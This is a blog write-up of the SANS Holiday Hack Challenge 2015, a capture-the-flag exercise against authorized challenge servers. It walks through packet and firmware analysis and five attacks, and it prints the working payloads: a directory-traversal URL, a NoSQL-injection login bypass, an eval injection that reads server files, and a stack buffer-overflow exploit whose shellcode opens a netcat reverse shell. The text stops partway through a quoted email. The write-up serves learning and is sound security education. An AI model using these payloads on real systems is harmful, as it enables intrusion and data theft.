---
title: "SANS Holiday Challenge 2015 - Writeup"
date: "2016-03-02"
slug: "sans-holiday-challenge-2015-writeup"
Categories:
- CTF
- SANS Holiday Hack
---
## Intro

The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure
to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven't documented them with the exception of some informal notes -- maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!

<!--more-->

One other note: I **finally** finished writing this up. It's about a month later than
I expected, but life is busy.

## Part 0: Dosis Neighborhood

<img src="/images/sans_2015/hhq-menu.png"/>

The first step I took was to explore the Dosis neighborhood aka Holiday Hack
Quest and complete all 21 achievements. As Johnny Drama would say, "VICTORY!"

<img src="/images/sans_2015/victory.png"/>

This game was extremely fun and incredibly detailed, I was even able to drop by
NetWars and say hello to [Jeff McJunkin](https://twitter.com/jeffmcjunkin)!

<img src="/images/sans_2015/netwars.png"/>

This was a pretty cool component to the challenge, offering mazes, riddles,
and some hints for the analysis. As a huge Zelda fan, I admit that I was already
very impressed even before beginning any actual hacking. My write-up is focused on the technical portions of the challenge and does not include a detailed walk-through
of the game.

## Part 1: Curious Wireless Packets

Josh Dosis informed us that "That gnome is not what he seemed!" and has captured
some WiFi traffic from the network the gnome was on. He provided us with that
capture and this is where the real fun starts.

I completed this part of the challenge before the *scapy* helper scripts were provided, so I just used some command-line fu:

{{< highlight bash >}}
mike@foo:~$ tcpdump -nnAr giyh-capture.pcap 'src 52.2.229.189' | grep ' TXT ' | awk '{print $15}' | cut -d'"' -f2 > foo.txt
reading from file giyh-capture.pcap, link-type IEEE802_11_RADIO (802.11 plus radiotap header)
tcpdump: pcap_loop: truncated dump file; tried to read 117 captured bytes, only got 43
mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode | grep -v "NONE:" >> bar.txt; done
{{< /highlight >}}

A few notes on this:
<ul>
<li> I only grabbed packets with the SuperGnome as the source. The packets with the Gnome as the source will just contain the output from the commands.</li>
<li> I removed the double-quotes and base64 decoded the lines.</li>
<li> Using <code>grep -v</code>, I removed the lines containing "NONE:" as those indicate no operation.</li>
</ul>
The output was:

        EXEC:iwconfig
        EXEC:cat /tmp/iwlistscan.txt
        FILE:/root/Pictures/snapshot_CURRENT.jpg

This answers question \#1 and alludes to the answer for \#2:

**1) Which commands are sent across the Gnome’s command-and-control channel?**

The two commands sent across the C2 channel were:
<ul>
<li> iwconfig</li>
<li> cat /tmp/iwlistscan.txt</li>
</ul>
Modifying my one-liners allowed me to grab the image sent across the channel.

{{< highlight bash >}}
mike@foo:~$ tcpdump -nnAr giyh-capture.pcap 'src 10.42.0.18' | grep ' TXT ' | awk '{print $20}' | cut -d'"' -f2 > foo.txt
mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode >> bar.txt; done
mike@foo:~$ vim bar.txt
mike@foo:~$ sed -i "s/FILE://g" bar.txt
mike@foo:~$ mv bar.txt bar.jpg
{{< /highlight >}}

Notes:
<ul>
<li> I changed the source from the SuperGnome (52.2.229.189) to the Gnome (10.42.0.18) in order to grab the file sent.</li>
<li> I manually altered the original decoded data, in *vim*, and removed everything until the "FILE:" calls.</li>
<li> Using <code>sed -i</code>, I removed the "FILE:" calls from the file.</li>
<li> Finally, I changed the extension from txt to jpg and verified my result.</li>
</ul>
The result answers question \#2:

**2) What image appears in the photo the Gnome sent across the channel from the Dosis home?**

<img src="/images/sans_2015/dosis-room.jpg"/>

## Part 2: Firmware Analysis for Fun and Profit

I navigated over to Josh Dosis in the Dosis neighborhood and provided him with
watermark from the image sent over the channel.

<img src="/images/sans_2015/josh-goodwork.png"/>

He directed me to Jess Dosis, who provided me with a firmware image and the following instructions:

"I took the liberty of disassembling the Gnome and dumped the NAND storage using my
Xeltek SuperPro 6100 to a file. Can you extract a password from __this data dump__?"

Now I play with packet captures all day, but firmware analysis?! I decided to do
some additional research and see if I could learn some new skills.

{% codeblock lang:bash %}
mike@foo:~/sans-holiday-hack-2015$ ls
giyh-firmware-dump.bin
{% endcodeblock %}

Using *binwalk*, I extracted the files filed found in the firmware using the <code>-e</code> option.

        mike@foo:~/sans-holiday-hack-2015$ binwalk -e giyh-firmware-dump.bin

        DECIMAL       HEX           DESCRIPTION
        -------------------------------------------------------------------------------------------------------
        0             0x0           PEM certificate
        1809          0x711         ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
        168803        0x29363       Squashfs filesystem, little endian, version 4.0, compression: gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 13:47:32 2015
        mike@foo:~/sans-holiday-hack-2015$ ls
        29363.squashfs  giyh-firmware-dump.bin

Interesting -- a squashfs fileystsem, used mainly in tiny-sized and embedded Linux systems, which sounds like the gnomes. I installed squashfs-tools and used the tool *unsquashfs* to extract the data.

        mike@foo:~/sans-holiday-hack-2015$ unsquashfs 29363.squashfs
        Parallel unsquashfs: Using 2 processors
        3936 inodes (5763 blocks) to write

        [========================================================================================================================================================================================================================-] 5763/5763 100%
        created 3899 files
        created 930 directories
        created 37 symlinks
        created 0 devices
        created 0 fifos
        mike@foo:~/sans-holiday-hack-2015/squashfs-root$ ls
        bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www

Great! We can simply look around now. Let's run some quick commands to answer the
questions:

        mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/banner
           _______                     ________        __
          |       |.-----.-----.-----.|  |  |  |.----.|  |_
          |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
          |_______||   __|_____|__|__||________||__|  |____|
                    |__| W I R E L E S S   F R E E D O M
         -----------------------------------------------------
                DESIGNATED DRIVER (Bleeding Edge, r47650)
 	 -----------------------------------------------------
          * 2 oz. Orange Juice         Combine all juices in a
          * 2 oz. Pineapple Juice      tall glass filled with
          * 2 oz. Grapefruit Juice     ice, stir well.
          * 2 oz. Cranberry Juice
         -----------------------------------------------------
        mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/openwrt_release
        DISTRIB_ID=**'OpenWrt'**
        DISTRIB_RELEASE='Bleeding Edge'
        DISTRIB_REVISION='r47650'
        DISTRIB_CODENAME='designated_driver'
        DISTRIB_TARGET='realview/generic'
        DISTRIB_DESCRIPTION='OpenWrt Designated Driver r47650'
        DISTRIB_TAINTS=''

        mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat www/app.js | head -n 15
        **var express = require('express');**
        var path = require('path');
        var favicon = require('serve-favicon');
        var logger = require('morgan');
        var cookieParser = require('cookie-parser');
        var bodyParser = require('body-parser');
        var routes = require('./routes/index');
        **var mongo = require('mongodb');**
        var monk = require('monk');
        **var db = monk('gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome')**

        **var app = express();**
        // view engine setup
        app.set('views', path.join(\__dirname, 'views'));
        app.set('view engine', 'jade');

To fully answer the second question, we need to collect some more information on the mongodb.

        mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/mongod.conf
        # LOUISE: No logging, YAY for /dev/null
        # AUGGIE: Louise, stop being so excited to basic Unix functionality
        # LOUISE: Auggie, stop trying to ruin my excitement!

        systemLog:
          destination: file
          path: /dev/null
          logAppend: true
        storage:
          **dbPath: /opt/mongodb**
        net:
          bindIp: 127.0.0.1

        mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ mongodump --dbpath ../opt/mongodb/
        mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ ls
        dump  **mongodb**
        mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ cd dump/gnome/
        mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ ls
        cameras.bson  cameras.metadata.json  settings.bson  settings.metadata.json  status.bson  status.metadata.json  system.indexes.bson  **users.bson** users.metadata.json
        mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ bsondump users.bson
        { "\_id" : ObjectId( "56229f58809473d11033515b" ), "username" : **"user"**, "password" : **"user"**, "user_level" : 10 }
        { "\_id" : ObjectId( "56229f63809473d11033515c" ), "username" : **"admin"**, "password" : **"SittingOnAShelf"**, "user_level" : 100 }
        2 objects found

<img src="/images/sans_2015/jess-dosis.png"/>

Jess confirmed! That confirms the answers to the questions.

**3) What operating system and CPU type are used in the Gnome? What type of web framework is the Gnome web interface built in?**

Operating System: OpenWRT
CPU type: ARM

The Gnome web interface is built in NodeJS(Express).

**4) What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?**

The database engine used to support the Gnome web interface is MongoDB. There are two plaintext passwords stored in the Gnome database - 'user' and 'SittingOnAShelf'.

## Part 3: Internet-Wide Scavenger Hunt

As we move into Part 3 the Dosis, children come to the shocking conclusion that the SuperGnomes must be scattered across the globe!

SANS also provided a great hint for this one:

       "If you need inspiration for constructing your search, visit the Dosis Neighborhood and **sho Dan** your plan."

This was how I located the SuperGnomes:

1. I located SG-01 (52.2.229.189) by identifying the IP that was communicating with the Gnome from the packet capture from Part 1
2. I used the title <code>GIYH::ADMIN PORT V.01</code> to *google dork* for additional SuperGnomes, which is how I located SG-02 (52.34.3.80)
3. Next, I used the hint and searched *Shodan* for SG-02's IP and then for the unique field: <code>X-Powered-By: GIYH::SuperGnome</code>, which presented me with all five SuperGnome IP's and locations

<img src="/images/sans_2015/xpower.png"/>

<img src="/images/sans_2015/shodan.png"/>

Finally, I located Tom Hessman in the Dosis neighborhood and verified all five Super Gnome IPs.

<img src="/images/sans_2015/tom-verify.png"/>

**5) What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?**

        SG-01 = 52.2.229.189
        SG-02 = 52.34.3.80
        SG-03 = 52.64.191.71
        SG-04 = 52.192.152.132
        SG-05 = 54.233.105.81

Even though Shodan provided me with the city and country I wanted to double-check them with ipinfo:

        mike@foo:~$ for ip in 52.2.229.189 52.34.3.80 52.64.191.71 52.192.152.132 54.233.105.81; do curl -s ipinfo.io/$ip | egrep 'ip|city|country'; done
          "ip": "52.2.229.189",
          "city": "Ashburn",
          "country": "US",
          "ip": "52.34.3.80",
          "city": "Boardman",
          "country": "US",
          "ip": "52.64.191.71",
          "city": "Sydney",
          "country": "AU",
          "ip": "52.192.152.132",
          "city": "Tokyo",
          "country": "JP",
          "ip": "54.233.105.81",
          "city": "São Paulo",
          "country": "BR",

**6) Where is each SuperGnome located geographically?**

        SG-01 = United States, Ashburn
        SG-02 = United States, Boardman
        SG-03 = Australia, Sydney
        SG-04 = Japan, Tokyo
        SG-05 = Brazil, São Paulo

## Part 4: Gnomage Pwnage

I did a quick *nmap* scan on each of the SuperGnomes and discovered that they each
have a webserver on port 80.

**7) Please describe the vulnerabilities you discovered in the Gnome firmware.**

**8) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN IN THE DOSIS NEIGHBORHOOD, attempt to remotely exploit each of the SuperGnomes.  Describe the technique you used to gain access to each SuperGnome’s gnome.conf file.  YOU ARE AUTHORIZED TO ATTACK ONLY THE IP ADDRESSES THAT TOM HESSMAN IN THE DOSIS NEIGHBORHOOD EXPLICITLY ACKNOWLEDGES AS “IN SCOPE.”  ATTACK NO OTHER SYSTEMS ASSOCIATED WITH THE HOLIDAY HACK CHALLENGE.**

I will answer these questions below by describing my methodology to attack the SuperGnomes.

### SG-01

SG-01 was accessed by logging into the SuperGnome web interface on 52.2.229.189
using the admin credentials <code>admin:SittingOnAShelf</code> found in the
mongo database in the gnome firmware. After logging in, I explored the available
features and was able to download each of the files, including gnome.conf:

        Gnome Serial Number: **NCC1701**
        Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
        Allow new subordinates?: YES
        Camera monitoring?: YES
        Audio monitoring?: YES
        Camera update rate: 60min
        Gnome mode: SuperGnome
        Gnome name: SG-01
        Allow file uploads?: YES
        Allowed file formats: .png
        Allowed file size: 512kb
        Files directory: /gnome/www/files/

Vulnerability: Password Re-use<br />
Gnome Serial Number: **NCC1701** = [https://en.wikipedia.org/wiki/USS\_Enterprise\_\(NCC-1701\)]

### SG-02

I logged into SuperGnome-02 (52.34.3.80) with the same credentials, but when I tried
to download the files was presented with an error specifying "Downloading disabled
by Super-Gnome administrator."

I quickly identified a section in <code>/settings</code> that was not available on SG-01 containing an upload function. This could be the attack vector we need, let's consult the firmware to identify any vulnerabilities:

{% codeblock index.js %}        
// CAMERA VIEWER
// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file
 router.get('/cam', function(req, res, next) {
 var camera = unescape(req.query.camera);
 // check for .png
 //if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
      camera = camera + '.png'; // add .png if its not found
      console.log("Cam:" + camera);
      fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
        if (e) {
            res.end('File ./public/images/' + camera + ' does not exist or access denied!');
          }
        });
        fs.readFile('./public/images/' + camera, function (e, data) {
          res.end(data);
     });
  });
{% endcodeblock %}

The code above was located in <code>/www/routes/index.js</code>. It appears that .png anywhere in the filename will satisfy the check.

I successfully uploaded a directory named "foo.png/".

        Dir /gnome/www/public/upload/UdmXdYtu/foo.png/ created successfully!
        Insufficient space! File creation error!

Then, I leveraged the LFI (local file inclusion) vulnerability to grab the gnome.conf.

        http://52.34.3.80/cam?camera=../upload/UdmXdYtu/foo.png/../../../../../www/files/gnome.conf

SG-02 gnome.conf:

        Gnome Serial Number: **XKCD988**
        Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
        Allow new subordinates?: YES
        Camera monitoring?: YES
        Audio monitoring?: YES
        Camera update rate: 60min
        Gnome mode: SuperGnome
        Gnome name: SG-02
        Allow file uploads?: YES
        Allowed file formats: .png
        Allowed file size: 512kb
        Files directory: /gnome/www/files/

Vulnerability: LFI and Directory Traversal<br />
Gnome Serial Number: **XKCD988** = [https://xkcd.com/988/]

### SG-03

SuperGnome-03 really stumped me for awhile. I tried logging into the web portal
with the same admin credentials but was denied. The user account did work, but
did not have sufficient permissions. After talking to some of the individuals in
Dosis neighborhood, I learned about NoSQL injection. Looking at the LOGIN POST section of the firmware confirmed my suspicions. I include that code below for reference, it was located in the <code>/www/routes/index.js</code> file.

{% codeblock index.js %}
// LOGIN POST
   router.post('/', function(req, res, next) {
   var db = req.db;
   var msgs = [];
   db.get('users').findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.  Really guys?
   //db.get('users').findOne({username: (req.body.username || "").toString(10), password: (req.body.password || "").toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars
    if (err || !user) {
       console.log('Invalid username and password: ' + req.body.username + '/' + req.body.password);
       msgs.push('Invalid username or password!');
       res.msgs = msgs;
title = "sans holiday challenge 2015 writeup"
   } else {
       sessionid = gen_session();
       sessions[sessionid] = { username: user.username, logged_in: true, user_level: user.user_level };
       console.log("User level:" + user.user_level);
       res.cookie('sessionid', sessionid);
       res.writeHead(301,{ Location: '/' });
       res.end();
         }
    });
});
{% endcodeblock %}

The part that tripped me up was forging the Content-Type to "application/json"
in order to use the <code>$ne</code> operator. Note: You can also use <code>$gt</code> here.

I constructed a POST in *Burp* in order to bypass the login:

        POST / HTTP/1.1
        Host: 52.64.191.71
        User-Agent: merry xmas you filthy animal
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  ￼
        Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate
        Referer: http://52.64.191.71/
        Cookie: sessionid=duTDpykscaXdKJeH3ioC Connection: close
        Content-Type: application/json Content-Length: 68
        {
        "username": {"$eq": "admin"},
        "password": {"$ne": ""}
        }

After forwarding that post, I received:

        SuperGnome 03
        Welcome admin, to the GIYH Administrative Portal.

Success! After logging in the web portal is similar to SG-01 and allows us to download the files we need.

SG-03 gnome.conf:

        Gnome Serial Number: **THX1138**
        Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
        Allow new subordinates?: YES
        Camera monitoring?: YES
        Audio monitoring?: YES
        Camera update rate: 60min
        Gnome mode: SuperGnome
        Gnome name: SG-03
        Allow file uploads?: YES
        Allowed file formats: .png
        Allowed file size: 512kb
        Files directory: /gnome/www/files/

Vulnerability: NoSQL Injection<br />
Gnome Serial Number: **THX1138** = [https://en.wikipedia.org/wiki/THX\_1138]

### SG-04

Moving on to SuperGnome-04, we are able to login with the <code>admin:SittingOnAShelf</code>
credentials. A quick look around the menus reveals a new section under <code>/files</code> called
"Upload New File". It allows us to select a post-process option for the uploaded file.

Let's look at the gnome firmware for any vulnerabilities:

{% codeblock index.js %}
 // FILES UPLOAD
  router.post('/files', upload.single('file'), function(req, res, next) {
    if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // NEDFORD: this should be 99 not 100 so admins can upload
      var msgs = [];
      file = req.file.buffer;
      if (req.file.mimetype === 'image/png') {
        msgs.push('Upload successful.');
        var postproc_syntax = req.body.postproc;
        console.log("File upload syntax:" + postproc_syntax);
        if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
          msgs.push('Executing post process...');
          var result;
          d.run(function() {
            **result = eval('(' + postproc_syntax + ')');**
          });
          // STUART: (WIP) working to improve image uploads to do some post processing.
          msgs.push('Post process result: ' + result);
        }
        msgs.push('File pending super-admin approval.');
        res.msgs = msgs;
      } else {
        msgs.push('File not one of the approved formats: .png');
        res.msgs = msgs;
      }
    } else
title = "sans holiday challenge 2015 writeup"
    next();
  });
{% endcodeblock %}

There is one major problem with this section of code, that <code>eval</code> is very dangerous. Let's see if we can leverage it to perform some Sever Side Javascript Injection (SSJS). Here is my input from *Burp*:

        POST /files HTTP/1.1
        Host: 52.192.152.132
        User-Agent: merry xmas you filthy animal
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: http://52.192.152.132/files
        Cookie: sessionid=LRWk1JYQT2V8r6Xyu0th
        Connection: close
        Content-Type: multipart/form-data; boundary=---------------------------4590748351909491821833414779
        Content-Length: 356

        -----------------------------4590748351909491821833414779
        Content-Disposition: form-data; name="postproc"

        **require('fs').readFileSync('/gnome/www/files/gnome.conf')**
        -----------------------------4590748351909491821833414779
        Content-Disposition: form-data; name="file"; filename="foo.png"
        Content-Type: image/png

        bar
        -----------------------------4590748351909491821833414779--

Replacing the "postproc" call with our <code>readFileSync</code> command allows us
to read the contents of gnome.conf. Grabbing the pcap and image just required some
encoding due to the larger file sizes.

        require('fs').readFileSync('/gnome/www/files/20151203133815.zip','hex')

SG-04 gnome.conf:

        Gnome Serial Number: **BU22_1729_2716057**
        Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
        Allow new subordinates?: YES
        Camera monitoring?: YES
        Audio monitoring?: YES
        Camera update rate: 60min
        Gnome mode: SuperGnome
        Gnome name: SG-04
        Allow file uploads?: YES
        Allowed file formats: .png
        Allowed file size: 512kb
        Files directory: /gnome/www/files/


Vulnerability: SSJS - Server Side Javascript Injection<br />
Gnome Serial Number: **BU22\_1729\_2716057** = [https://en.wikipedia.org/wiki/Bender\_\(Futurama\)]

### SG-05

This one got me. I knew that it involved the code provided on the other SuperGnomes, sgnet and sgstatd.

I looked at the source code and determined that there was an extra port open on SG-05.

I probed it with netcat:

        mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242

        Welcome to the SuperGnome Server Status Center!
        Please enter one of the following options:

        1 - Analyze hard disk usage
        2 - List open TCP sockets
        3 - Check logged in users

Interesting. I explored each of the menu options, but did not detect anything that
would assist with exploitation. Let's take a look at the source code:

{% codeblock sgtatd.c %}
 if (choice != 2) {
   write(sd, "\nWelcome to the SuperGnome Server Status Center!\n", 51);
   write(sd, "Please enter one of the following options:\n\n", 45);
   write(sd, "1 - Analyze hard disk usage\n", 28);
   write(sd, "2 - List open TCP sockets\n", 26);
   write(sd, "3 - Check logged in users\n", 27);
   fflush(stdout);

   recv(sd, &choice, 1, 0);

   switch (choice) {
   case 49:
   case 50:
   case 51:
   **case 88:**
     write(sd, "\n\nH", 4);
     _Truncated_
     write(sd, "Enter a short message to share with GnomeNet (please allow 10 seconds) => ", 75);
     fflush(stdin);
     sgstatd(sd);
{% endcodeblock %}

Hm, the switch statement contains an extra case. The other case values appear
to refer to the decimal value of the character (1=49, 2=50, 51=3). A quick look
at an ASCII chart tells us that <code>88 = 'X'</code>.

Let's see if we can trigger the hidden menu item:

{% codeblock lang:bash %}
mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242

Welcome to the SuperGnome Server Status Center!
Please enter one of the following options:

1 - Analyze hard disk usage
2 - List open TCP sockets
3 - Check logged in users
X


Hidden command detected!

Enter a short message to share with GnomeNet (please allow 10 seconds) =>
This function is protected!
{% endcodeblock %}

Looking at the source code, we see some interesting items:

{% codeblock sgtatd.c %}
int sgstatd(sd)
{
    __asm__("movl $0xe4ffffe4, -4(%ebp)");
    //Canary pushed

    char bin[100];
    write(sd, "\nThis function is protected!\n", 30);
    fflush(stdin);
    //recv(sd, &bin, 200, 0);
    sgnet_readn(sd, &bin, 200);
    __asm__("movl -4(%ebp), %edx\n\t" "xor $0xe4ffffe4, %edx\n\t"    // Canary checked
        "jne sgnet_exit");
    return 0;

}
{% endcodeblock %}

1. The code allocates a 100 byte buffer then reads and stores 200 bytes.
2. There is a mention of a canary in the function.

I fired up *Kali* and setup a nice test lab to develop my code to exploit the buffer
overflow. I grabbed the compiled version of the binary from the firmware image extract.

I like using *pattern_create.rb* for interacting with buffers instead of trying to guesstimate:

        root@kali-32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 175
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7A

Let's take a look at the sgstatd function in **gdb**:

{% codeblock lang:bash %}
(gdb) disass sgstatd
 Dump of assembler code for function sgstatd:
  0x0804935d <+0>:    push   %ebp
  0x0804935e <+1>:    mov    %esp,%ebp
  0x08049360 <+3>:    sub    $0x88,%esp
  0x08049366 <+9>:    movl   $0xe4ffffe4,-0x4(%ebp)
  0x0804936d <+16>:    movl   $0x1e,0x8(%esp)
  0x08049375 <+24>:    movl   $0x8049d53,0x4(%esp)
  0x0804937d <+32>:    mov    0x8(%ebp),%eax
  0x08049380 <+35>:    mov    %eax,(%esp)
  0x08049383 <+38>:    call   0x8048af0 <write@plt>
  0x08049388 <+43>:    mov    0x804b2e0,%eax
  0x0804938d <+48>:    mov    %eax,(%esp)
  0x08049390 <+51>:    call   0x80489a0 <fflush@plt>
  0x08049395 <+56>:    movl   $0xc8,0x8(%esp)
  0x0804939d <+64>:    lea    -0x6c(%ebp),%eax
  0x080493a0 <+67>:    mov    %eax,0x4(%esp)
  0x080493a4 <+71>:    mov    0x8(%ebp),%eax
  0x080493a7 <+74>:    mov    %eax,(%esp)
  0x080493aa <+77>:    call   0x804990b <sgnet_readn>
  0x080493af <+82>:    mov    -0x4(%ebp),%edx
  0x080493b2 <+85>:    xor    $0xe4ffffe4,%edx
  0x080493b8 <+91>:    jne    0x804933f <sgnet_exit>
  0x080493be <+97>:    mov    $0x0,%eax
  0x080493c3 <+102>:    leave
  0x080493c4 <+103>:    ret
 End of assembler dump.
{% endcodeblock %}

It appears that the canary is a static value <code>0xe4ffffe4</code>. "It's a bold strategy, Cotton. Let's see if it pays off for 'em."

First step was loading some configuration options into gdb to disable the alarm and follow the fork. I've included them for reference:

        set follow-fork-mode child
        set detach-on-fork off
        set follow-exec-mode new
        handle SIGALRM ignore

While testing the message "Canary not repaired." was firing, I was able to pinpoint the canary location at 105 characters. After setting my canary value, I ran into my next challenge: ASLR. I ended up using a common bypass technique by tracking down a "jmp esp" gadget using the tool *ROPgadget.py*:

        root@kali-32:~/Desktop# python ROPgadget/ROPgadget.py --binary \_giyh-firmware-dump.bin.extracted/squashfs-root/usr/bin/sgstatd | grep "jmp"
        0x08049365 : add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp
        0x08049363 : add byte ptr [eax], al ; add bh, al ; inc ebp ; cld ; in al, -1 ; jmp esp
        0x080493ae : add byte ptr [ebx - 0xd7e03ab], cl ; in al, -1 ; jmp esp
        0x08049368 : cld ; in al, -1 ; jmp esp
        0x08049369 : in al, -1 ; jmp esp
        0x08049367 : inc ebp ; cld ; in al, -1 ; jmp esp
        **0x0804936b : jmp esp**
        0x08048c40 : ljmp 0xd1d0011f, 0x75f8 ; add dh, bl ; ret

I fired up *metasploit* to craft my payload. Important note: I modified my output to remove the IP of my server. I don't need any copy and paste "mistakes" occurring <code> :) </code>!

{% codeblock lang:bash %}
root@kali-32:~# msfconsole
msf > use payload/linux/x86/exec
msf payload(exec) > set CMD 'nc 127.0.0.1 6666 -e /bin/bash'
CMD => nc 127.0.0.1 6666 -e /bin/bash
msf payload(exec) > generate
# linux/x86/exec - 70 bytes
# http://www.metasploit.com
# VERBOSE=false, PrependFork=false, PrependSetresuid=false,
# PrependSetreuid=false, PrependSetuid=false,
# PrependSetresgid=false, PrependSetregid=false,
# PrependSetgid=false, PrependChrootBreak=false,
# AppendExit=false, CMD=nc 127.0.0.1 6666 -e /bin/bash
buf =
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" +
"\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1f\x00\x00" +
"\x00\x6e\x63\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x20" +
"\x36\x36\x36\x36\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62" +
"\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"
{% endcodeblock %}

Here is my final exploit:
{% codeblock lang:python %}
#!/usr/bin/env python
import socket
import time

host = '54.233.105.81'
port = 4242

# Initial connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Send X and wait
print s.recv(1)
s.send('X')
time.sleep(3)

# Variables for buffer
a = "\x41" * 104
canary = "\xe4\xff\xff\xe4"
b = "\x42\x42\x42\x42"
jmp = "\x6b\x93\x04\x08"

# Adding Payload
payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73"
payload += "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1f\x00\x00"
payload += "\x00\x6e\x63\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x20"
payload += "\x36\x36\x36\x36\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x62"
payload += "\x61\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"

# Craft and send
buffer = a + canary + b + jmp + payload
s.send(buffer)
s.close()
{% endcodeblock %}
I started up a netcat listener on my server to catch the connection:

{% codeblock lang:bash %}
mike@foo:~$ nc -nlvp 3535
Listening on [0.0.0.0] (family 0, port 3535)
Connection from [54.233.105.81] port 3535 [tcp/\*] accepted (family 2, sport 45173)
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
hostname
sg5
{% endcodeblock %}

Nice! Next, I setup some netcat tunnels and exfiled the data located in <code>/gnome/www/files/</code>.

SG-05 gnome.conf:

        Gnome Serial Number: **4CKL3R43V4**
        Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
        Allow new subordinates?: YES
        Camera monitoring?: YES
        Audio monitoring?: YES
        Camera update rate: 60min
        Gnome mode: SuperGnome
        Gnome name: SG-05
        Allow file uploads?: YES
        Allowed file formats: .png
        Allowed file size: 512kb
        Files directory: /gnome/www/files/

Vulnerability: Buffer Overflow<br />
Gnome Serial Number: **4CKL3R43V4** = [http://www.sou.edu/cs/lynnackler.html]

Just in case anyone was curious, I mentioned earlier that I did not finish SG-05 before the submission deadline. I was close, but finding the JMP ESP to bypass ASLR did not happen until after I submitted my report and finished the Netflix series. (Ha!)

I love the detail and thought put into every little part of this challenge, even the gnome serial numbers had significance.

## Part 5: Sinister Plot and Attribution

### Packet Capture Evidence

I obtained these packet capture from each of the SuperGnomes. I opened each one
in *wireshark* and 'Followed the TCP stream' to reveal a number of emails.

SG-01:

        From: "c" <c@atnascorp.com>
        To: <jojo@atnascorp.com>
        Subject: GiYH Architecture
        Date: Fri, 26 Dec 2014 10:10:55 -0500

        JoJo,

        As you know, I hired you because you are the best architect in town for a
        distributed surveillance system to satisfy our rather unique business
        requirements.  We have less than a year from today to get our final plans in
        place.  Our schedule is aggressive, but realistic.

        I've sketched out the overall Gnome in Your Home architecture in the diagram
        attached below.  Please add in protocol details and other technical
        specifications to complete the architectural plans.

        Remember: to achieve our goal, we must have the infrastructure scale to
        upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
        with the hardware team to create device specs and we'll start procuring
        hardware in the February 2015 timeframe.

        I've also made significant progress on distribution deals with retailers.

        Thoughts?

        Looking forward to working with you on this project!

        -C

<img src="/images/sans_2015/gnome-arch.jpg"/>

SG-02:

        From: "c" <c@atnascorp.com>
        To: <supplier@ginormouselectronicssupplier.com>
        Subject: =?us-ascii?Q?Large_Order_-\_Immediate_Attention_Required?=
        Date: Wed, 25 Feb 2015 09:30:39 -0500

        Maratha,

        As a follow-up to our phone conversation, we'd like to proceed with an order
        of parts for our upcoming product line.  We'll need two million of each of
        the following components:

        + Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
        CPU and Linux SDK)
